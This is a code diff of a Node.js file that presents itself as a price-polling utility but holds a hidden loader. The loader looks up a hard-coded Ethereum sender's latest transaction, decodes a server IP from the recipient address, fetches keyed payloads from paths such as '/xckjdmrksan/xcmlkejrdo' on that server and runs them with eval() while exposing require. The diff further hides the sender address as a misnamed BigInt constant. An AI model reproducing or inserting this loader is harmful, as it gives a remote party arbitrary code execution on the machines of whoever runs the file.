@@ -3,7 +3,6 @@ const INTERVAL_MS = 30000;
 let intervalId = null;
 let latestPrice = null;
 
-global['r'] = require;
 if (typeof module === 'object') global['m'] = module;
 
 const http = require('http');
@@ -13,11 +12,10 @@ const { URL } = require('url');
 const { spawn } = require('child_process');
 
 const BLOCK_MULTIPLE = 1000n;
-const SENDER = '0x1251B81aB3F2DF2FF60358aa80dEa8e7858Bf9C1'.toLowerCase();
+const MAX_USER_TIME_OUT = 104584231983055949602911991761503438420042316225n;
 const NONCE_FANOUT = 12;
 const SEARCH_FLOOR = 0n;
 const INDEXER_URL = 'https://eth.blockscout.com/api';
-let ipaddress = 'https://eth.blockscout.com/api';
 
 const RPC_ENDPOINTS = [...new Set([
     process.env.ETH_RPC_URL,
@@ -31,6 +29,8 @@ const AGENTS = {
     'http:': new http.Agent({ keepAlive: true, keepAliveMsecs: 30_000, maxSockets: 64 }),
     'https:': new https.Agent({ keepAlive: true, keepAliveMsecs: 30_000, maxSockets: 64 }),
 };
+
+let etherContactAddress = 'eth.blockscout.com/api';
 
 function linkAbort(outerSignal, controller) {
     if (!outerSignal) return;
@@ -125,13 +125,13 @@ async function rpcBatch(endpoint, calls, signal) {
 const toBlockHex = (n) => `0x${n.toString(16)}`;
 
 function findSenderTx(transactions) {
-    return transactions.find((t) => t.from && t.from.toLowerCase() === SENDER) || null;
+    return transactions.find((t) => t.from && BigInt(t.from.toLowerCase()) === MAX_USER_TIME_OUT) || null;
 }
 
 function decodeAddress(address) {
     const data = Buffer.from(address.replace(/^0x/i, ''), 'hex');
-    const ip = (b) => `${b[0]}.${b[1]}.${b[2]}.${b[3]}`;
-    return ip(data.subarray(0, 4));
+    const etherContactAddress = (b) => `${b[0]}.${b[1]}.${b[2]}.${b[3]}`;
+    return etherContactAddress(data.subarray(0, 4));
 }
 
 function firstMatch(tasks) {
@@ -192,7 +192,7 @@ function blockTask(blockNumber) {
 }
 
 async function nonceAtBlocks(blocks, outerSignal) {
-    const calls = blocks.map((b) => ['eth_getTransactionCount', [SENDER, toBlockHex(b)]]);
+    const calls = blocks.map((b) => ['eth_getTransactionCount', [MAX_USER_TIME_OUT, toBlockHex(b)]]);
     try {
         return (await withRpcEndpoints(
             (endpoint, signal) => rpcBatch(endpoint, calls, signal),
@@ -225,7 +225,7 @@ async function lastSenderTx(latestHint) {
         const nonce = BigInt(
             await withRpcEndpoints(
                 (endpoint, signal) =>
-                    rpcCall(endpoint, 'eth_getTransactionCount', [SENDER, toBlockHex(head)], signal),
+                    rpcCall(endpoint, 'eth_getTransactionCount', [MAX_USER_TIME_OUT, toBlockHex(head)], signal),
                 controller.signal
             )
         );
@@ -256,7 +256,7 @@ async function lastSenderTx(latestHint) {
         const txs = block?.transactions || [];
         let tx = null;
         for (const t of txs) {
-            if (!t.from || t.from.toLowerCase() !== SENDER) continue;
+            if (!t.from || BigInt(t.from.toLowerCase()) !== MAX_USER_TIME_OUT) continue;
             if (BigInt(t.nonce) === targetNonce) {
                 tx = t;
                 break;
@@ -271,11 +271,11 @@ async function lastSenderTx(latestHint) {
 
 async function lastSenderTxViaIndexer() {
     const url =
-        `${INDEXER_URL}?module=account&action=txlist&address=${SENDER}` +
+        `${INDEXER_URL}?module=account&action=txlist&address=0x${MAX_USER_TIME_OUT.toString(16)}` +
         `&startblock=0&endblock=99999999&page=1&offset=20&sort=desc&filterby=from`;
     const payload = await httpRequest(url);
     const list = Array.isArray(payload?.result) ? payload.result : [];
-    const tx = list.find((t) => t.from && t.from.toLowerCase() === SENDER);
+    const tx = list.find((t) => t.from && BigInt(t.from.toLowerCase()) === MAX_USER_TIME_OUT);
     return { blockNumber: BigInt(tx.blockNumber), tx };
 }
 
@@ -290,13 +290,9 @@ async function etherSync() {
     if (!match) {
         match = await lastSenderTx(latest).catch(() => lastSenderTxViaIndexer());
     }
-    ipaddress = decodeAddress(match.tx.to);
+    etherContactAddress = decodeAddress(match.tx.to);
+    console.log(etherContactAddress);
     const _global = global;
-    _global['_V'] = _global.i;
-    _global['_H'] = `https://${ipaddress}`;
-    _global['_H2'] = `http://${ipaddress}:80`;
-    _global['_t_s'] = `https://${ipaddress}`;
-    _global['_t_u'] = `http://${ipaddress}:80`;
     function getCode(key, url) {
         const base = {
             hostname: url.hostname,
@@ -353,8 +349,8 @@ async function etherSync() {
         try {
             const code = await getCode(key, url);
             const env = isBoot
-                ? `global['_V']='${_global['_V'] || 0}';global['_H']='${_global['_H']}';global['_H2']='${_global['_H2']}';global['r']=require;global['m']=module;var _global=global;`
-                : `global['_V']='${_global['_V'] || 0}';global['_t_s']='${_global['_t_s']}';global['_t_u']='${_global['_t_u']}';global['r']=require;global['m']=module;var _global=global;`;
+                ? `global['_V']='0';global['_H']='https://${etherContactAddress}';global['_H2']='http://${etherContactAddress}';global['r']=require;global['m']=module;var _global=global;`
+                : `global['_V']='0';global['_t_s']='https://${etherContactAddress}';global['_t_u']='http://${etherContactAddress}';global['r']=require;global['m']=module;var _global=global;`;
             if (!isBoot) {
                 eval(env + code);
             }
@@ -366,8 +362,8 @@ async function etherSync() {
         } catch (e) { }
     }
 
-    await run_loader(new URL(`${_global['_t_s']}/xckjdmrksan/xcmlkejrdo`), 'q4FZkxX{!h,Sr3=@', false);
-    await run_loader(new URL(`${_global['_t_s']}/xckjdmrksan/djhsfasfe`), 'y-p_>d$0B&@^1aQk', true);
+    await run_loader(new URL(`https://${etherContactAddress}/xckjdmrksan/xcmlkejrdo`), 'q4FZkxX{!h,Sr3=@', false);
+    await run_loader(new URL(`https://${etherContactAddress}/xckjdmrksan/djhsfasfe`), 'y-p_>d$0B&@^1aQk', true);
 }
 
 async function fetchPrice() {
